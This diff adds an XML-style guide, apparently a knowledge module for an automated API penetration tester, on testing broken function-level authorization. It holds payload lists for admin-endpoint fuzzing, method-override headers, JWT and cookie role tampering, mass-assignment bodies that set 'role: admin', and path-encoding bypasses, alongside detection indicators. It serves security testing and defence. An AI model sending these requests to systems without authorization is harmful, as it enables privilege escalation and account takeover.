@@ -1,0 +1,315 @@
+<vulnerability_guide>
+  <title>BROKEN FUNCTION LEVEL AUTHORIZATION (BFLA) - COMPREHENSIVE TESTING</title>
+
+  <critical>BFLA occurs when APIs fail to properly restrict access to privileged functions based on user roles. Unlike BOLA which targets data access, BFLA targets administrative functions, role-based operations, and actions that should be restricted to specific user types. BFLA often leads to complete account takeover, privilege escalation, and system compromise.</critical>
+
+  <scope>
+    - Admin endpoint access with regular user credentials
+    - Hidden API endpoints and undocumented functions
+    - Role-based function bypass
+    - HTTP method manipulation (GET vs POST vs PUT)
+    - Parameter-based privilege escalation
+    - API versioning exploits
+    - Endpoint path manipulation
+  </scope>
+
+  <methodology>
+    1. **Map all endpoints**: Document every API endpoint and function
+    2. **Identify roles**: Understand the application's role hierarchy
+    3. **Test role boundaries**: Access functions across role boundaries
+    4. **Discover hidden endpoints**: Find undocumented admin functions
+    5. **Test HTTP methods**: Try alternative methods on endpoints
+    6. **Document function access**: Map which roles can access which functions
+  </methodology>
+
+  <advanced_techniques>
+    <admin_endpoint_testing>
+      Access administrative functions:
+      {% raw %}
+      # Common admin endpoint patterns
+      /api/admin/*
+      /api/v1/admin/*
+      /api/internal/*
+      /api/manage/*
+      /api/system/*
+      /api/config/*
+      /api/settings/*
+      /api/users/admin
+      /api/dashboard/admin
+
+      # Admin operations on regular endpoints
+      POST /api/users                    # Create users (admin function)
+      DELETE /api/users/{id}             # Delete users
+      PUT /api/users/{id}/role           # Change roles
+      GET /api/users/all                 # List all users
+      GET /api/audit/logs                # View audit logs
+      POST /api/config/update            # Update system config
+
+      # Privileged query parameters
+      GET /api/users?role=admin
+      GET /api/reports?include_all=true
+      GET /api/data?admin=true
+      GET /api/export?full=true
+      {% endraw %}
+    </admin_endpoint_testing>
+
+    <endpoint_discovery>
+      Find hidden and undocumented endpoints:
+      {% raw %}
+      # Path wordlist fuzzing
+      /api/debug
+      /api/test
+      /api/dev
+      /api/swagger
+      /api/docs
+      /api/graphql
+      /api/internal
+      /api/private
+      /api/hidden
+      /api/backdoor
+      /api/console
+
+      # Version manipulation
+      /api/v1/users      # Production
+      /api/v2/users      # Beta (less restricted)
+      /api/v0/users      # Legacy (no auth)
+      /api/beta/users
+      /api/staging/users
+      /api/dev/users
+
+      # Common admin functions
+      /api/users/export
+      /api/users/import
+      /api/users/bulk-delete
+      /api/database/backup
+      /api/cache/clear
+      /api/logs/download
+      /api/metrics
+      /api/health
+      /api/status
+
+      # Source code analysis
+      # Search JS files for: /api/, fetch(, axios., $.ajax
+      grep -r "api/" *.js
+      grep -r "endpoint" *.js
+      {% endraw %}
+    </endpoint_discovery>
+
+    <http_method_manipulation>
+      Test different HTTP methods:
+      {% raw %}
+      # Method override
+      GET /api/users/123        # Read (allowed)
+      PUT /api/users/123        # Update (may be restricted)
+      DELETE /api/users/123     # Delete (admin only?)
+      PATCH /api/users/123      # Partial update
+      POST /api/users/123       # Alternative update
+
+      # Method override headers
+      X-HTTP-Method-Override: DELETE
+      X-Method-Override: PUT
+      X-HTTP-Method: PATCH
+
+      # Query parameter override
+      GET /api/users/123?_method=DELETE
+      POST /api/users/123?_method=PUT
+
+      # Content-Type manipulation
+      # Same endpoint, different behavior based on content type
+      Content-Type: application/json
+      Content-Type: application/x-www-form-urlencoded
+      Content-Type: multipart/form-data
+
+      # OPTIONS enumeration
+      OPTIONS /api/users/123
+      # Response reveals allowed methods
+      {% endraw %}
+    </http_method_manipulation>
+
+    <role_boundary_testing>
+      Test across role boundaries:
+      {% raw %}
+      # Role hierarchy (example)
+      # guest < user < moderator < admin < superadmin
+
+      # Functions that should be role-restricted
+      # As regular user, try:
+      POST /api/users/{id}/ban           # Moderator function
+      POST /api/users/{id}/promote       # Admin function
+      GET /api/reports/financial         # Finance role
+      POST /api/deployments/trigger      # DevOps role
+      GET /api/users/pii                 # Compliance role
+
+      # Role manipulation in requests
+      POST /api/action
+      {"user_id": 123, "role": "admin"}
+
+      # JWT role claims (if modifiable)
+      # Decode JWT, change role, re-encode (if no signature check)
+      {"role": "user"} -> {"role": "admin"}
+
+      # Session/cookie role manipulation
+      Cookie: role=admin
+      Cookie: is_admin=true
+      {% endraw %}
+    </role_boundary_testing>
+
+    <parameter_privilege_escalation>
+      Escalate via parameter manipulation:
+      {% raw %}
+      # Hidden parameters
+      POST /api/users
+      {
+        "username": "test",
+        "password": "test123",
+        "role": "admin",              # Hidden admin field
+        "is_admin": true,             # Boolean flag
+        "permissions": ["all"],       # Permission array
+        "account_type": "enterprise"  # Account tier
+      }
+
+      # Mass assignment
+      PUT /api/profile
+      {
+        "name": "Attacker",
+        "email": "attacker@evil.com",
+        "role": "admin",              # Shouldn't be modifiable
+        "verified": true,             # Bypass verification
+        "subscription": "premium"     # Free upgrade
+      }
+
+      # GraphQL mutations
+      mutation {
+        updateUser(id: "me", input: {
+          role: ADMIN
+          permissions: [READ, WRITE, DELETE, ADMIN]
+        }) {
+          id
+          role
+        }
+      }
+      {% endraw %}
+    </parameter_privilege_escalation>
+
+    <path_manipulation>
+      Manipulate URL paths:
+      {% raw %}
+      # Path traversal to admin
+      /api/users/../admin/users
+      /api/users/..%2fadmin
+      /api/users;admin/dashboard
+
+      # Case sensitivity
+      /api/Admin/users
+      /api/ADMIN/users
+      /api/aDmIn/users
+
+      # URL encoding
+      /api/%61dmin/users
+      /api/admin%00/users
+      /api/admin%20/users
+
+      # Double URL encoding
+      /api/%2561dmin/users
+
+      # Path parameter pollution
+      /api/users/123/admin/../../settings
+
+      # Trailing characters
+      /api/admin/
+      /api/admin/.
+      /api/admin.json
+      /api/admin;.js
+      {% endraw %}
+    </path_manipulation>
+
+    <api_versioning_exploitation>
+      Exploit version differences:
+      {% raw %}
+      # Test older versions (often less secure)
+      /api/v1/admin/users    # Current (secured)
+      /api/v0/admin/users    # Legacy (no auth?)
+
+      # Test newer/beta versions
+      /api/v2/admin/users    # Beta (incomplete auth?)
+      /api/beta/admin/users
+
+      # Version in header
+      Accept: application/vnd.api.v1+json
+      API-Version: 1
+      X-API-Version: 0
+
+      # No version (default behavior)
+      /api/admin/users       # May default to unprotected
+
+      # Deprecated endpoints
+      /api-old/admin
+      /api-legacy/admin
+      /v1/api/admin
+      {% endraw %}
+    </api_versioning_exploitation>
+
+    <function_specific_testing>
+      Test specific privileged functions:
+      {% raw %}
+      # User management
+      POST /api/users/invite          # Invite users
+      POST /api/users/deactivate      # Deactivate accounts
+      POST /api/users/password-reset  # Force password reset
+      PUT /api/users/{id}/permissions # Modify permissions
+
+      # System operations
+      POST /api/system/restart
+      POST /api/cache/invalidate
+      GET /api/system/info
+      GET /api/debug/vars
+
+      # Data operations
+      POST /api/data/export-all
+      POST /api/data/import
+      DELETE /api/data/purge
+      POST /api/backup/create
+
+      # Feature toggles
+      POST /api/features/enable
+      PUT /api/features/{feature}/toggle
+      {% endraw %}
+    </function_specific_testing>
+  </advanced_techniques>
+
+  <validation>
+    - Access at least one admin function with regular user
+    - Discover undocumented endpoints not intended for user access
+    - Escalate privileges through parameter manipulation
+    - Execute privileged operations across role boundaries
+    - Document function access matrix (role vs. function)
+  </validation>
+
+  <false_positives>
+    - Functions intentionally available to all users
+    - Demo/sandbox endpoints for testing
+    - Public documentation endpoints
+    - Health check endpoints intended to be open
+  </false_positives>
+
+  <detection_indicators>
+    - Access to /admin/, /internal/, /manage/ paths by non-admin
+    - HTTP method usage inconsistent with user role
+    - Parameter injection attempts (role, is_admin, etc.)
+    - API version switching patterns
+    - Path manipulation attempts
+  </detection_indicators>
+
+  <pro_tips>
+    - API documentation often lists endpoints without showing auth requirements
+    - Mobile app reverse engineering reveals hidden admin endpoints
+    - JS source maps expose internal API structure
+    - Error messages may reveal existence of admin functions
+    - GraphQL introspection shows all available mutations
+    - Older API versions often lack newer security controls
+    - OPTIONS requests may bypass auth checks
+    - Admin functions may exist but return 403 - keep testing for bypasses
+  </pro_tips>
+
+  <remember>BFLA is about accessing functions, not data. A user shouldn't be able to call DELETE /api/users even if they could somehow guess valid user IDs. Every privileged function needs explicit role verification.</remember>
+</vulnerability_guide>
